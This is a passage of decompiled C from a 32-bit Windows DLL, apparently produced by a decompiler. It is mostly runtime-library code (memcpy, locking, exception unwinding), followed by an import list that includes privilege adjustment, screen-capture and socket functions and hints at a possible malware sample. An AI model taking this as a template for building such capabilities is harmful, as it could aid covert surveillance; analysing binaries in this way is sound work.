                                __asm_movdqa(*(int128_t *)(v120 + 16), __asm_palignr(v113, v116, 12));
                                v109 = __asm_movdqa_9(v115);
                                __asm_movdqa(*(int128_t *)(v120 + 32), __asm_palignr(v115, v117, 12));
                                v118 = v120 + 48;
                                v119 = v112;
                                v120 = v118;
                            }
                            // 0x1000c1f9
                            v79 = v112;
                            v81 = v110 + 60;
                            v80 = v118;
                        }
                    }
                    int32_t v121 = v79; // 0x1000c2b3
                    int32_t v122 = v81; // 0x1000c2b3
                    int32_t v123 = v80; // 0x1000c2b3
                    if (v79 >= 16) {
                        int128_t v124 = __asm_movdqu_11(*(int128_t *)v81); // 0x1000c2b5
                        int32_t v125 = v79 - 16; // 0x1000c2b9
                        int32_t v126 = v81 + 16; // 0x1000c2bc
                        __asm_movdqa(*(int128_t *)v80, v124);
                        int32_t v127 = v80 + 16; // 0x1000c2c3
                        int32_t v128 = v127; // 0x1000c2b3
                        int32_t v129 = v126; // 0x1000c2b3
                        int32_t v130 = v125; // 0x1000c2b3
                        while (v125 >= 16) {
                            // 0x1000c2b5
                            v124 = __asm_movdqu_11(*(int128_t *)v129);
                            v125 = v130 - 16;
                            v126 = v129 + 16;
                            __asm_movdqa(*(int128_t *)v128, v124);
                            v127 = v128 + 16;
                            v128 = v127;
                            v129 = v126;
                            v130 = v125;
                        }
                        // 0x1000c2b0
                        v121 = v79 & 15;
                        v122 = v126;
                        v123 = v127;
                    }
                    int32_t v131 = v121; // 0x1000c2cc
                    int32_t v132 = v122; // 0x1000c2cc
                    int32_t v133 = v123; // 0x1000c2cc
                    if ((v121 & 4) != 0) {
                        // 0x1000c2ce
                        *(int32_t *)v123 = *(int32_t *)v122;
                        v131 = v121 - 4;
                        v132 = v122 + 4;
                        v133 = v123 + 4;
                    }
                    int32_t v134 = v131; // 0x1000c0f0
                    int32_t v135 = v132; // 0x1000c0f0
                    int32_t v136 = v133; // 0x1000c0f0
                    while (true) {
                      lab_0x1000c2f2:
                        // 0x1000c2f2
                        g154 = v134;
                        result = result3;
                        v14 = v135;
                        v8 = v136;
                        v9 = v135;
                        v3 = v136;
                        v10 = v135;
                        v4 = v136;
                        switch (v134) {
                            case 0: {
                                return result;
                            }
                            case 1: {
                                goto lab_0x1000c440;
                            }
                            case 2: {
                                goto lab_0x1000c44c;
                            }
                            case 3: {
                                goto lab_0x1000c460;
                            }
                            default: {
                                // 0x1000c2e1
                                __asm_movq_10(*(int64_t *)v136, __asm_movq(*(int64_t *)v135));
                                v134 -= 8;
                                v135 += 8;
                                v136 += 8;
                                goto lab_0x1000c2f2;
                            }
                        }
                    }
                }
                goto lab_0x1000c303;
            }
        }
    }
  lab_0x1000c440:
    // 0x1000c440
    *(char *)v8 = *(char *)v14;
    return result3;
  lab_0x1000c44c:
    // 0x1000c44c
    *(char *)v3 = *(char *)v9;
    *(char *)(v3 + 1) = *(char *)(v9 + 1);
    return result3;
  lab_0x1000c460:
    // 0x1000c460
    *(char *)v4 = *(char *)v10;
    *(char *)(v4 + 1) = *(char *)(v10 + 1);
    *(char *)(v4 + 2) = *(char *)(v10 + 2);
    return result3;
  lab_0x1000c2fb:;
    int32_t result5 = result3 & 3;
    v2 = v1;
    if (result5 != 0) {
        // 0x1000c318
        if (a3 < 4) {
            // 0x1000c324
            return result3;
        }
        // 0x1000c324
        return result5;
    }
    goto lab_0x1000c303;
  lab_0x1000c5dc:
    // 0x1000c5dc
    *(char *)(v5 + 3) = *(char *)(v11 + 3);
    return result3;
  lab_0x1000c5ec:
    // 0x1000c5ec
    *(char *)(v6 + 3) = *(char *)(v12 + 3);
    *(char *)(v6 + 2) = *(char *)(v12 + 2);
    return result3;
  lab_0x1000c600:
    // 0x1000c600
    *(char *)(v7 + 3) = *(char *)(v13 + 3);
    *(char *)(v7 + 2) = *(char *)(v13 + 2);
    *(char *)(v7 + 1) = *(char *)(v13 + 1);
    return result3;
  lab_0x1000c303:;
    int32_t v137 = a3 / 4; // 0x1000c303
    g156 = v137;
    result = v2;
    int32_t result6; // 0x1000c0f0
    int32_t v138; // 0x1000c0f0
    int32_t v139; // 0x1000c0f0
    int32_t v140; // 0x1000c0f0
    int32_t v141; // 0x1000c0f0
    int32_t v142; // 0x1000c0f0
    switch (v137) {
        case 0: {
            goto lab_0x1000c330;
        }
        case 1: {
            // 0x1000c303
            result6 = a3 & -4;
            goto lab_0x1000c40c;
        }
        case 2: {
            // 0x1000c303
            v138 = a3 & -4;
            goto lab_0x1000c404;
        }
        case 3: {
            // 0x1000c303
            v139 = a3 & -4;
            goto lab_0x1000c3fc;
        }
        case 4: {
            // 0x1000c303
            v140 = a3 & -4;
            goto lab_0x1000c3f4;
        }
        case 5: {
            // 0x1000c303
            v141 = a3 & -4;
            goto lab_0x1000c3ec;
        }
        case 6: {
            // 0x1000c303
            v142 = a3 & -4;
            goto lab_0x1000c3e4;
        }
        case 7: {
            int32_t v143 = a3 & -4;
            int32_t v144 = v143 - 28;
            *(int32_t *)(v144 + result3) = *(int32_t *)(v144 + a2);
            v142 = v143;
            goto lab_0x1000c3e4;
        }
        default: {
            int32_t v145 = a3 & 3; // 0x1000c306
            __asm_rep_movsd_memcpy((char *)result3, (char *)a2, v137);
            bool v146; // 0x1000c0f0
            int32_t v147 = (v146 ? -4 : 4) * v137 + result3; // 0x1000c30e
            g155 = v145;
            result = result3;
            v14 = v147;
            v8 = v147;
            v9 = v147;
            v3 = v147;
            v10 = v147;
            v4 = v147;
            switch (v145) {
                case 0: {
                    goto lab_0x1000c330;
                }
                case 1: {
                    goto lab_0x1000c440;
                }
                case 2: {
                    goto lab_0x1000c44c;
                }
                case 3: {
                    goto lab_0x1000c460;
                }
                default: {
                    // 0x1000c3381
                    // UNREACHABLE
                }
            }
        }
    }
  lab_0x1000c40c:;
    int32_t v148 = result6 - 4;
    *(int32_t *)(v148 + result3) = *(int32_t *)(v148 + a2);
    // 0x1000c324
    return result6;
  lab_0x1000c404:;
    int32_t v149 = v138 - 8;
    *(int32_t *)(v149 + result3) = *(int32_t *)(v149 + a2);
    result6 = v138;
    goto lab_0x1000c40c;
  lab_0x1000c3fc:;
    int32_t v150 = v139 - 12;
    *(int32_t *)(v150 + result3) = *(int32_t *)(v150 + a2);
    v138 = v139;
    goto lab_0x1000c404;
  lab_0x1000c3f4:;
    int32_t v151 = v140 - 16;
    *(int32_t *)(v151 + result3) = *(int32_t *)(v151 + a2);
    v139 = v140;
    goto lab_0x1000c3fc;
  lab_0x1000c3ec:;
    int32_t v152 = v141 - 20;
    *(int32_t *)(v152 + result3) = *(int32_t *)(v152 + a2);
    v140 = v141;
    goto lab_0x1000c3f4;
  lab_0x1000c3e4:;
    int32_t v153 = v142 - 24;
    *(int32_t *)(v153 + result3) = *(int32_t *)(v153 + a2);
    v141 = v142;
    goto lab_0x1000c3ec;
}

// Address range: 0x1000c92c - 0x1000c92f
int32_t function_1000c92c(void) {
    // 0x1000c92c
    return 1;
}

// Address range: 0x1000c92f - 0x1000c934
int32_t function_1000c92f(int32_t a1) {
    // 0x1000c92f
    int32_t result; // 0x1000c92f
    return result;
}

// Address range: 0x1000c994 - 0x1000c99b
// Demangled:     void __stdcall _CallMemberFunction0(void *, void *)
void _3f__CallMemberFunction0_40__40_YGXPAX0_40_Z(int32_t * result, int32_t * a2, int32_t * a3) {
    // 0x1000c994
    return;
}

// Address range: 0x1000cb1b - 0x1000cb22
int32_t function_1000cb1b(int32_t a1) {
    // 0x1000cb1b
    int32_t result; // 0x1000cb1b
    return result;
}

// Address range: 0x1000cd2a - 0x1000cd35
// Demangled:     public: virtual __thiscall Concurrency::details::ThreadProxy::~ThreadProxy(void)
int32_t _3f__3f_1ThreadProxy_40_details_40_Concurrency_40__40_UAE_40_XZ(void) {
    // 0x1000cd2a
    int32_t v1; // 0x1000cd2a
    *(int32_t *)v1 = (int32_t)&g5;
    return _3f__Tidy_40_exception_40_std_40__40_AAEXXZ();
}

// Address range: 0x1000cde7 - 0x1000cdf4
// From class:    .?AVbad_alloc@std@@
// Type:          virtual member function
int32_t function_1000cde7(void) {
    // 0x1000cde7
    int32_t v1; // 0x1000cde7
    int32_t v2 = *(int32_t *)(v1 + 4); // 0x1000cde7
    return v2 != 0 ? v2 : (int32_t)"Unknown exception";
}

// Address range: 0x1000d00c - 0x1000d014
int32_t __heap_term(void) {
    // 0x1000d00c
    g84 = 0;
    int32_t result; // 0x1000d00c
    return result;
}

// Address range: 0x1000d03a - 0x1000d047
int32_t __initp_heap_handler(int32_t result) {
    // 0x1000d03a
    g85 = result;
    return result;
}

// Address range: 0x1000d684 - 0x1000d68d
int32_t function_1000d684(void) {
    // 0x1000d684
    return __unlock(13);
}

// Address range: 0x1000d690 - 0x1000d699
int32_t function_1000d690(void) {
    // 0x1000d690
    return __unlock(12);
}

// Address range: 0x1000d7f7 - 0x1000d800
int32_t function_1000d7f7(void) {
    // 0x1000d7f7
    return __unlock(13);
}

// Address range: 0x1000d800 - 0x1000d809
int32_t function_1000d800(void) {
    // 0x1000d800
    return __unlock(12);
}

// Address range: 0x1000d8fe - 0x1000d90b
int32_t __initp_misc_purevirt(int32_t result) {
    // 0x1000d8fe
    g86 = result;
    return result;
}

// Address range: 0x1000d90b - 0x1000d913
int32_t __crt_debugger_hook(void) {
    // 0x1000d90b
    g153 = 0;
    int32_t result; // 0x1000d90b
    return result;
}

// Address range: 0x1000dc8a - 0x1000dc98
int32_t ___crtSleep(int32_t dwMilliseconds) {
    // 0x1000dc8a
    Sleep(dwMilliseconds);
    return &g161;
}

// Address range: 0x1000dced - 0x1000dd8a
int32_t function_1000dced(int32_t a1, int32_t a2) {
    // 0x1000dced
    int32_t v1; // 0x1000dced
    __asm_wait(0x10000 * v1 / 0x10000);
    bool v2; // 0x1000dced
    if (v2) {
        if ((a2 & 0xfffff || a1) == 0) {
            if (a2 > -1) {
                goto lab_0x1000dd0e;
            } else {
                goto lab_0x1000dd6b;
            }
        } else {
            // 0x1000dd42
            __convertTOStoQNaN();
            goto lab_0x1000dd6b;
        }
    } else {
        int32_t v3 = a2; // 0x1000dcfe
        if ((int16_t)v1 != 639) {
            // 0x1000dd00
            v3 = __load_CW();
        }
        // 0x1000dd05
        if (v3 <= -1) {
            if ((v3 & 0x7ff00000) != 0) {
                goto lab_0x1000dd6b;
            } else {
                if ((v3 & 0xfffff || a1) == 0) {
                    goto lab_0x1000dd0e;
                } else {
                    goto lab_0x1000dd6b;
                }
            }
        } else {
            goto lab_0x1000dd0e;
        }
    }
  lab_0x1000dd0e:
    // 0x1000dd0e
    if (g82 != 0) {
        __fast_exit((int32_t)&g161);
    }
    // 0x1000dd1b
    return __math_exit();
  lab_0x1000dd6b:
    // 0x1000dd6b
    if (g82 != 0) {
        __fast_exit((int32_t)&g161);
    }
    // 0x1000dd78
    return __startOneArgErrorHandling();
}

// Address range: 0x1000e5db - 0x1000e5e8
int32_t __initp_misc_invarg(int32_t result) {
    // 0x1000e5db
    g87 = result;
    return result;
}

// Address range: 0x1000e7cb - 0x1000e7d4
int32_t function_1000e7cb(void) {
    // 0x1000e7cb
    return __unlock(10);
}

// Address range: 0x1000e924 - 0x1000e92d
int32_t function_1000e924(void) {
    // 0x1000e924
    return __unlock(14);
}

// Address range: 0x1000eb4f - 0x1000eb60
int32_t * __initp_eh_hooks(int32_t * Ptr) {
    int32_t * result = EncodePointer(Ptr); // 0x1000eb54
    g88 = (int32_t)result;
    return result;
}

// Address range: 0x1000eb60 - 0x1000eb6d
int32_t * ___get_sigabrt(int32_t * Ptr) {
    // 0x1000eb60
    return DecodePointer(Ptr);
}

// Address range: 0x1000ed0a - 0x1000ed17
int32_t function_1000ed0a(void) {
    // 0x1000ed0a
    int32_t result; // 0x1000ed0a
    int32_t v1; // 0x1000ed0a
    if (v1 != 0) {
        // 0x1000ed0e
        result = __unlock(0);
    }
    // 0x1000ed16
    return result;
}

// Address range: 0x1000ed17 - 0x1000ed1b
int32_t function_1000ed17(void) {
    // 0x1000ed17
    int32_t result; // 0x1000ed17
    return result;
}

// Address range: 0x1000ed1b - 0x1000ed3c
int32_t function_1000ed1b(int32_t a1) {
    // 0x1000ed1b
    int32_t v1; // 0x1000ed1b
    int32_t v2; // 0x1000ed1b
    *(int32_t *)(v1 + 96) = *(int32_t *)(v2 - 44);
    int32_t result = *(int32_t *)(v2 - 48); // 0x1000ed36
    *(int32_t *)(v1 + 100) = result;
    return result;
}

// Address range: 0x1000ed7e - 0x1000ed8b
int32_t __initp_misc_rand_s(int32_t result) {
    // 0x1000ed7e
    g89 = result;
    return result;
}

// Address range: 0x1000f0df - 0x1000f0e8
int32_t function_1000f0df(void) {
    // 0x1000f0df
    return __unlock(13);
}

// Address range: 0x1000f25a - 0x1000f263
int32_t function_1000f25a(void) {
    // 0x1000f25a
    return __unlock(13);
}

// Address range: 0x1000f263 - 0x1000f265
int32_t function_1000f263(void) {
    // 0x1000f263
    int32_t result; // 0x1000f263
    return result;
}

// Address range: 0x10010613 - 0x1001061c
int32_t function_10010613(void) {
    // 0x10010613
    return __unlock(12);
}

// Address range: 0x100106fb - 0x10010704
int32_t function_100106fb(void) {
    // 0x100106fb
    return __unlock(12);
}

// Address range: 0x1001079e - 0x100107a4
int32_t ___iob_func(void) {
    // 0x1001079e
    return (int32_t)&g69;
}

// Address range: 0x10010c9e - 0x10010ca7
int32_t function_10010c9e(void) {
    // 0x10010c9e
    return __unlock(11);
}

// Address range: 0x10011232 - 0x1001123d
int32_t function_10011232(void) {
    // 0x10011232
    int32_t v1; // 0x10011232
    *(int32_t *)v1 = (int32_t)&g6;
    return _3f__Tidy_40_exception_40_std_40__40_AAEXXZ();
}

// Address range: 0x100112f7 - 0x10011301
int32_t function_100112f7(int32_t * a1) {
    // 0x100112f7
    return _3f_ExFilterRethrow_40__40_YAHPAU_EXCEPTION_POINTERS_40__40__40_Z(a1);
}

// Address range: 0x10011301 - 0x10011388
int32_t function_10011301(void) {
    // 0x10011301
    int32_t v1; // 0x10011301
    int32_t v2 = *(int32_t *)(v1 - 24); // 0x10011301
    *(int32_t *)(__getptd() + 940) = 0;
    int32_t v3 = *(int32_t *)(v1 + 20); // 0x10011311
    int32_t * v4 = (int32_t *)(v1 + 12); // 0x10011314
    int32_t v5 = *v4; // 0x10011314
    int32_t v6 = v5 + 8;
    int32_t v7; // 0x10011301
    if (*(int32_t *)(v3 + 4) > 128) {
        // 0x10011326
        v7 = *(int32_t *)v6;
    } else {
        // 0x10011320
        v7 = (int32_t)*(char *)v6;
    }
    int32_t * v8 = (int32_t *)(v1 - 32); // 0x10011329
    *v8 = v7;
    int32_t * v9 = (int32_t *)(v1 - 36); // 0x10011331
    *v9 = 0;
    int32_t * v10 = (int32_t *)(v3 + 12); // 0x10011334
    int32_t v11 = v7; // 0x10011337
    int32_t v12 = v5; // 0x10011337
    if (*v10 != 0) {
        int32_t v13 = 0; // 0x1001136a
        int32_t v14; // 0x1001133f
        int32_t v15; // 0x10011343
        while (true) {
            int32_t v16 = 20 * v13; // 0x10011339
            *(int32_t *)(v1 + 24) = v16;
            int32_t v17 = v16 + *(int32_t *)(v3 + 16);
            v14 = *(int32_t *)(v17 + 4);
            v15 = *v4;
            if (v7 > v14) {
                // 0x10011348
                if (v7 <= *(int32_t *)(v17 + 8)) {
                    // break -> 0x10011354
                    break;
                }
            }
            // 0x1001136a
            v13++;
            *v9 = v13;
            v11 = v7;
            v12 = v15;
            if (v13 >= *v10) {
                goto lab_0x10011373;
            }
        }
        int32_t v18 = v14 + 1; // 0x1001135b
        *v8 = v18;
        int32_t v19 = *(int32_t *)(*(int32_t *)(v3 + 8) + 8 * v18); // 0x10011362
        *v8 = v19;
        v11 = v19;
        v12 = v15;
    }
  lab_0x10011373:
    // 0x10011373
    *(int32_t *)(v2 - 4) = v11;
    *(int32_t *)(v2 - 8) = v3;
    *(int32_t *)(v2 - 12) = 0;
    *(int32_t *)(v2 - 16) = v12;
    int32_t result = ___FrameUnwindToState(); // 0x10011377
    *(int32_t *)(v1 - 28) = 0;
    *(int32_t *)(v1 - 4) = 0;
    return result;
}

// Address range: 0x10011388 - 0x100113a3
int32_t function_10011388(void) {
    // 0x10011388
    int32_t v1; // 0x10011388
    *(int32_t *)(v1 - 4) = -2;
    *(int32_t *)(v1 + 16) = 0;
    function_100113a9();
    return __SEH_epilog4();
}

// Address range: 0x100113a9 - 0x10011428
int32_t function_100113a9(void) {
    // 0x100113a9
    int32_t v1; // 0x100113a9
    int32_t v2; // 0x100113a9
    *(int32_t *)(v1 - 4) = *(int32_t *)(v2 - 40);
    __FindAndUnlinkFrame(*(int32_t *)(v2 - 44));
    *(int32_t *)(__getptd() + 136) = *(int32_t *)(v2 - 48);
    int32_t result = __getptd(); // 0x100113c6
    *(int32_t *)(result + 140) = *(int32_t *)(v2 - 52);
    int32_t v3; // 0x100113a9
    if (v3 != -0x1f928c9d || *(int32_t *)(v3 + 16) != 3) {
        // 0x10011427
        return result;
    }
    int32_t v4 = *(int32_t *)(v3 + 20); // 0x100113e2
    if ((v4 & -2) != 0x19930520 == (v4 != 0x19930522) || *(int32_t *)(v2 - 28) == 0 | *(int32_t *)(v2 - 56) != 0) {
        // 0x10011427
        return result;
    }
    int32_t result2 = 0; // 0x10011415
    if (__IsExceptionObjectToBeDestroyed(*(int32_t *)(v3 + 24)) != 0) {
        // 0x10011417
        result2 = ___DestructExceptionObject(v3, *(int32_t *)(v2 + 16));
    }
    // 0x10011427
    return result2;
}

// Address range: 0x10011a6b - 0x10011a70
int32_t function_10011a6b(void) {
    // 0x10011a6b
    _3f_terminate_40__40_YAXXZ();
    // UNREACHABLE
}

// Address range: 0x10011b17 - 0x10011b1b
int32_t function_10011b17(void) {
    // 0x10011b17
    return 1;
}

// Address range: 0x10011df3 - 0x10011e0d
int32_t function_10011df3(void) {
    int32_t v1 = __getptd(); // 0x10011df3
    int32_t result = v1; // 0x10011dff
    if (*(int32_t *)(v1 + 144) >= 1) {
        // 0x10011e01
        result = __getptd();
        int32_t * v2 = (int32_t *)(result + 144); // 0x10011e06
        *v2 = *v2 - 1;
    }
    // 0x10011e0c
    return result;
}

// Address range: 0x10012fe6 - 0x10013002
int32_t function_10012fe6(int32_t a1) {
    int32_t v1 = *(int32_t *)(a1 + 40); // 0x10012ff3
    int32_t v2; // 0x10012fe6
    return __local_unwind4(v1, *(int32_t *)(a1 + 24), *(int32_t *)(a1 + 28), v2);
}

// Address range: 0x100132b3 - 0x100132bd
int32_t function_100132b3(void) {
    // 0x100132b3
    return function_10013379();
}

// Address range: 0x100132bd - 0x100132c4
int32_t function_100132bd(void) {
    // 0x100132bd
    return function_10013379();
}

// Address range: 0x100132c4 - 0x100132cb
float80_t function_100132c4(void) {
    // 0x100132c4
    return 0.0L;
}

// Address range: 0x100132cb - 0x100132d2
float80_t function_100132cb(void) {
    // 0x100132cb
    return 1.0L;
}

// Address range: 0x100132d2 - 0x100132fd
float80_t function_100132d2(void) {
    // 0x100132d2
    int32_t v1; // 0x100132d2
    char * v2 = (char *)(v1 - 144);
    float80_t result; // 0x100132d2
    if ((*(char *)(v1 - 151) & 64) == 0) {
        // 0x100132ef
        *v2 = 1;
        return result + 1.0L;
    }
    // 0x100132e7
    *v2 = 7;
    return result;
}

// Address range: 0x100132fd - 0x10013327
float80_t function_100132fd(void) {
    // 0x100132fd
    int32_t v1; // 0x100132fd
    *(char *)(v1 - 144) = (*(char *)(v1 - 151) & 64) == 0 ? 1 : 7;
    float80_t v2; // 0x100132fd
    return 2 * v2;
}

// Address range: 0x10013327 - 0x10013366
float80_t function_10013327(void) {
    // 0x10013327
    int32_t v1; // 0x10013327
    char * v2 = (char *)(v1 - 151); // 0x10013333
    float80_t v3; // 0x10013327
    if ((*v2 & 64) == 0 || (*v2 & 64) == 0) {
        // 0x1001335c
        *(char *)(v1 - 144) = 1;
        // 0x10013363
        return 2 * v3;
    }
    // 0x10013353
    *(char *)(v1 - 144) = 7;
    // 0x10013363
    return 2 * v3;
}

// Address range: 0x10013379 - 0x10013383
int32_t function_10013379(void) {
    // 0x10013379
    int32_t v1; // 0x10013379
    *(char *)(v1 - 144) = 1;
    int32_t result; // 0x10013379
    return result;
}

// Address range: 0x10013383 - 0x1001338a
int32_t function_10013383(void) {
    // 0x10013383
    int32_t result; // 0x10013383
    return result;
}

// Address range: 0x100133f0 - 0x10013405
float80_t function_100133f0(void) {
    // 0x100133f0
    float80_t v1; // 0x100133f0
    llvm_round_f80(v1);
    float80_t v2 = llvm_exp2_f80(-1.0L) + 1.0L; // 0x100133fe
    return v2 * llvm_exp2_f80(llvm_round_f80(v2));
}

// Address range: 0x1001348e - 0x1001349b
int32_t __fast_exit(int32_t a1) {
    // 0x1001348e
    int32_t result; // 0x1001348e
    return result;
}

// Address range: 0x100134c5 - 0x100134d9
int32_t function_100134c5(void) {
    // 0x100134c5
    int32_t v1; // 0x100134c5
    return v1 & 0x7ff00000;
}

// Address range: 0x1001357c - 0x1001357f
int32_t __matherr(void) {
    // 0x1001357c
    return 0;
}

// Address range: 0x10013610 - 0x10013617
int32_t function_10013610(void) {
    // 0x10013610
    __amsg_exit(2);
    // UNREACHABLE
}

// Address range: 0x10013617 - 0x10013619
int32_t function_10013617(int32_t a1) {
    // 0x10013617
    int32_t result; // 0x10013617
    return result;
}

// Address range: 0x10013abd - 0x10013ac6
int32_t __flushall(void) {
    // 0x10013abd
    return _flsall(1);
}

// Address range: 0x10013b6e - 0x10013b7f
int32_t function_10013b6e(void) {
    // 0x10013b6e
    int32_t v1; // 0x10013b6e
    return __unlock_file2(v1, *(int32_t *)(g152 + 4 * v1));
}

// Address range: 0x10013ba1 - 0x10013baa
int32_t function_10013ba1(void) {
    // 0x10013ba1
    return __unlock(1);
}

// Address range: 0x10013c71 - 0x10013c79
int32_t function_10013c71(void) {
    // 0x10013c71
    int32_t v1; // 0x10013c71
    return __unlock_fhandle(v1);
}

// Address range: 0x100145d0 - 0x100145d8
int32_t function_100145d0(void) {
    // 0x100145d0
    int32_t v1; // 0x100145d0
    return __unlock_fhandle(v1);
}

// Address range: 0x10014e0c - 0x10014e15
int32_t function_10014e0c(void) {
    // 0x10014e0c
    return __unlock(1);
}

// Address range: 0x10014f9c - 0x10014fa5
int32_t __NLG_Notify1(void) {
    // 0x10014f9c
    int32_t result; // 0x10014f9c
    return result;
}

// Address range: 0x10014fc4 - 0x10014fc7
int32_t __NLG_Call(void) {
    // 0x10014fc4
    int32_t result; // 0x10014fc4
    return result;
}

// Address range: 0x10014fc7 - 0x10014fd6
// Demangled:     int __cdecl _ValidateExecute(int (__stdcall *)(void))
int32_t _3f__ValidateExecute_40__40_YAHP6GHXZ_40_Z(int32_t (*a1)()) {
    // 0x10014fc7
    return (bool)(a1 != NULL);
}

// Address range: 0x100157d6 - 0x100157ec
int32_t function_100157d6(void) {
    // 0x100157d6
    return __chkstk();
}

// Address range: 0x10015a85 - 0x10015a8d
int32_t function_10015a85(void) {
    // 0x10015a85
    int32_t v1; // 0x10015a85
    return __unlock_fhandle(v1);
}

// Address range: 0x10015b2b - 0x10015b34
int32_t function_10015b2b(void) {
    // 0x10015b2b
    return __unlock(10);
}

// Address range: 0x10015ea6 - 0x10015eae
int32_t function_10015ea6(void) {
    // 0x10015ea6
    int32_t v1; // 0x10015ea6
    return __unlock_file(v1);
}

// Address range: 0x1001828a - 0x10018292
int32_t function_1001828a(void) {
    // 0x1001828a
    int32_t v1; // 0x1001828a
    return __unlock_fhandle(v1);
}

// Address range: 0x100185a0 - 0x100185a6
bool _IsProcessorFeaturePresent_40_4(int32_t ProcessorFeature) {
    // 0x100185a0
    return IsProcessorFeaturePresent(ProcessorFeature);
}

// Address range: 0x100185a6 - 0x100185ac
void _RtlUnwind_40_16(int32_t * TargetFrame, int32_t * TargetIp, struct _EXCEPTION_RECORD * ExceptionRecord, int32_t * ReturnValue) {
    // 0x100185a6
    RtlUnwind(TargetFrame, TargetIp, ExceptionRecord, ReturnValue);
}

// Address range: 0x100185f0 - 0x1001864a
int32_t function_100185f0(void) {
    // 0x100185f0
    int32_t result; // 0x100185f0
    if ((uint32_t)g79 >= 16) {
        // 0x100185fd
        int32_t v1; // 0x100185f0
        function_10002980(v1);
        function_10002980((int32_t)&g77);
        _free((int32_t *)g77);
        result = &g161;
    }
    // 0x1001862b
    g79 = 15;
    g78 = 0;
    *(char *)&g77 = 0;
    return result;
}

// Address range: 0x10018650 - 0x1001865b
int32_t function_10018650(void) {
    // 0x10018650
    *(int32_t *)&g80 = (int32_t)&g1;
    int32_t result; // 0x10018650
    return result;
}

// Address range: 0x10018660 - 0x1001866b
int32_t function_10018660(void) {
    // 0x10018660
    *(int32_t *)0x10022258 = (int32_t)&g1;
    int32_t result; // 0x10018660
    return result;
}

// Address range: 0x10018670 - 0x1001867b
int32_t function_10018670(void) {
    // 0x10018670
    g81 = &g1;
    int32_t result; // 0x10018670
    return result;
}

// Address range: 0x11f047eb - 0x11f047ec
int32_t function_11f047eb(void) {
    // 0x11f047eb
    int32_t result; // 0x11f047eb
    return result;
}

// Address range: 0x12483423 - 0x12483424
int32_t function_12483423(void) {
    // 0x12483423
    int32_t result; // 0x12483423
    return result;
}

// --------------- Statically Linked Functions ----------------

// int32_t ?_Syserror_map@std@@YAPBDH@Z(int32_t a1);
// int32_t ?_Xinvalid_argument@std@@YAXPBD@Z(char * a1);
// int32_t _3f__3f_2_40_YAPAXI_40_Z(int32_t a1);
// int32_t _3f__3f__GFreeThreadProxy_40_details_40_Concurrency_40__40_UAEPAXI_40_Z(int32_t a1);
// int32_t _3f__3f__GThreadProxy_40_details_40_Concurrency_40__40_UAEPAXI_40_Z(int32_t a1);
// int32_t _3f__Internal_throw_exception_40__Concurrent_queue_base_v4_40_details_40_Concurrency_40__40_IBEXXZ(void);
// int32_t _3f__Syserror_map_40_std_40__40_YAPBDH_40_Z(int32_t a1);
// int32_t _3f__Tidy_40_exception_40_std_40__40_AAEXXZ(void);
// int32_t _3f__Type_info_dtor_40_type_info_40__40_CAXPAV1_40__40_Z(int32_t * a1);
// int32_t _3f__Xinvalid_argument_40_std_40__40_YAXPBD_40_Z(char * a1);
// int32_t _3f_ExFilterRethrow_40__40_YAHPAU_EXCEPTION_POINTERS_40__40__40_Z(int32_t * a1);
// int32_t _3f_terminate_40__40_YAXXZ(void);
// int32_t ___DestructExceptionObject(int32_t a1, int32_t a2);
// int32_t ___FrameUnwindToState(void);
// int32_t ___report_gsfailure(void);
// int32_t ___report_securityfailure(int32_t a1, int32_t a2);
// int32_t __amsg_exit(int32_t a1);
// int32_t __chkstk(void);
// int32_t __convertTOStoQNaN(void);
// int32_t __FindAndUnlinkFrame(int32_t a1);
// int32_t __getptd(void);
// int32_t __IsExceptionObjectToBeDestroyed(int32_t a1);
// int32_t __load_CW(void);
// int32_t __local_unwind4(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
// int32_t __lock(int32_t a1);
// int32_t __math_exit(void);
// int32_t __mtterm(void);
// int32_t __SEH_epilog4(void);
// int32_t __startOneArgErrorHandling(void);
// int32_t __unlock(int32_t a1);
// int32_t __unlock_fhandle(int32_t a1);
// int32_t __unlock_file(int32_t a1);
// int32_t __unlock_file2(int32_t a1, int32_t a2);
// int atexit(void(* func)(void));
// int32_t _doexit(int32_t a1, int32_t a2, int32_t a3);
// int32_t _flsall(int32_t a1);
// void free(void * ptr);
// void * malloc(size_t size);
// size_t mbstowcs(wchar_t * restrict pwcs, const char * restrict s, size_t n);
// void * memcpy(void * restrict dest, const void * restrict src, size_t n);
// void * memset(void * s, int c, size_t n);
// int printf(const char * restrict format, ...);
// int rand(void);
// int sprintf(char * restrict s, const char * restrict format, ...);
// void srand(unsigned int seed);
// char * strncpy(char * restrict dest, const char * restrict src, size_t n);

// --------------- Dynamically Linked Functions ---------------

// BOOL AdjustTokenPrivileges(_In_ HANDLE TokenHandle, _In_ BOOL DisableAllPrivileges, _In_opt_ PTOKEN_PRIVILEGES NewState, _In_ DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, _Out_opt_ PDWORD ReturnLength);
// BOOL BitBlt(_In_ HDC hdc, _In_ int x, _In_ int y, _In_ int cx, _In_ int cy, _In_opt_ HDC hdcSrc, _In_ int x1, _In_ int y1, _In_ DWORD rop);
// BOOL CloseHandle(_In_ HANDLE hObject);
// int closesocket(_In_ SOCKET s);
// HDC CreateCompatibleDC(_In_opt_ HDC hdc);
// HBITMAP CreateDIBSection(_In_opt_ HDC hdc, _In_ const BITMAPINFO * pbmi, _In_ UINT usage, VOID ** ppvBits, _In_opt_ HANDLE hSection, _In_ DWORD offset);
// BOOL CreateDirectoryA(_In_ LPCSTR lpPathName, _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes);
// HANDLE CreateFileA(_In_ LPCSTR lpFileName, _In_ DWORD dwDesiredAccess, _In_ DWORD dwShareMode, _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes, _In_ DWORD dwCreationDisposition, _In_ DWORD dwFlagsAndAttributes, _In_opt_ HANDLE hTemplateFile);
// HANDLE CreateFileW(_In_ LPCWSTR lpFileName, _In_ DWORD dwDesiredAccess, _In_ DWORD dwShareMode, _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes, _In_ DWORD dwCreationDisposition, _In_ DWORD dwFlagsAndAttributes, _In_opt_ HANDLE hTemplateFile);
// HANDLE CreateMutexA(_In_opt_ LPSECURITY_ATTRIBUTES lpMutexAttributes, _In_ BOOL bInitialOwner, _In_opt_ LPCSTR lpName);
// HANDLE CreateMutexW(_In_opt_ LPSECURITY_ATTRIBUTES lpMutexAttributes, _In_ BOOL bInitialOwner, _In_opt_ LPCWSTR lpName);
